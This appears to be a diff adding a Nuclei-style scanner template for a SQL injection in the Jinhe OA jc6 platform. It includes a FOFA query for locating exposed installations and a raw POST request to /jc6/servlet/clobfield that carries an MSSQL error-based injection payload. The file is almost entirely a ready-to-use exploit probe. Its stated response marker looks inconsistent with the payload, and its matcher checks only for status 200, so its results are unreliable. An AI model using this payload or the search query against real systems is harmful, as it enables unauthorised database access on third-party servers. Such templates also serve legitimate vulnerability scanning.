@@ -1,0 +1,51 @@
+id: poc-rwoywegsqehtdyf9
+info:
+  name: 金和OA jc6 SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rwoywegsqehtdyf9'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rwoywegsqehtdyf9
+    fofa: title="金和协同管理平台"
+http:
+- raw:
+  - 'POST /jc6/servlet/clobfield HTTP/1.1
+
+
+    Accept: */*
+
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    SL-CE-SUID: 77
+
+
+
+
+    key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1'' and 1=convert(int,(select sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''12345''))))--+
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    e5b086206e766172
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
